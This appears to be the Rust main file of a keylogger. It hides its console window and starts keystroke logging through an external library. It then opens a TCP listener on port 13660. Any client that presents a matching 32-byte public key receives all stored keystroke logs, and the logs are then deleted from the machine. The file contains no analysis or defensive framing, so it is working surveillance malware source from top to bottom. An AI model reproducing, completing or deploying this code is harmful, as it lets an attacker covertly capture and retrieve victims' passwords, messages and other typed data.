#![windows_subsystem = "windows"]
extern crate keylogger_lib;

use std::io::Write;
use std::io::Read;

const PUB_KEY_PATH: &str = "pub_key.char";
const SYM_KEY_PATH: &str = "encryption_key.char";
const DELETE_UPON_RETRIEVAL: bool = true;

const LOGS_FOLDER_PATH: &str = "./logs/";


fn main() {
    let second_thread = std::thread::spawn(|| keylogger_lib::key_log(
        &keylogger_lib::EncryptionDetails { pub_key_loc: PUB_KEY_PATH.to_owned(), sym_key_loc: SYM_KEY_PATH.to_owned() }));

    let listener = std::net::TcpListener::bind("0.0.0.0:13660").expect("Listener Binding failed");
    //println!("listening started, ready to accept");
    for stream in listener.incoming() {
        let mut stream = stream.unwrap();

        // Check if server is actually the server by comparing public keys
        let mut pub_key_buffer: [u8; 32] = [0; 32];
        if stream.read(&mut pub_key_buffer).is_err() {
            stream.write(b"Wrong Key").is_ok();
            continue;
        }
        let mut local_pub_key_buffer: [u8; 32] = [0; 32];
        std::fs::File::open(PUB_KEY_PATH).unwrap().read(&mut local_pub_key_buffer).is_ok();
        if pub_key_buffer != local_pub_key_buffer {
            stream.write(b"Wrong Key").is_ok();
            continue;
        }

        let result = keylogger_lib::load_all_key_logs(LOGS_FOLDER_PATH).expect("Error loading keylogs");
        let header = result.iter().map(|&(ref name, ref data)| format!("{};{}", name.len(), data.len())).collect::<Vec<String>>().join(";") + "\n";

        stream.write(header.as_ref()).unwrap();
        for (name, data) in result {
            stream.write(name.as_bytes()).unwrap();
            stream.write(data.as_ref()).unwrap();
        }

        if DELETE_UPON_RETRIEVAL {
            keylogger_lib::delete_all_logs(LOGS_FOLDER_PATH).is_ok();
        }
    }
}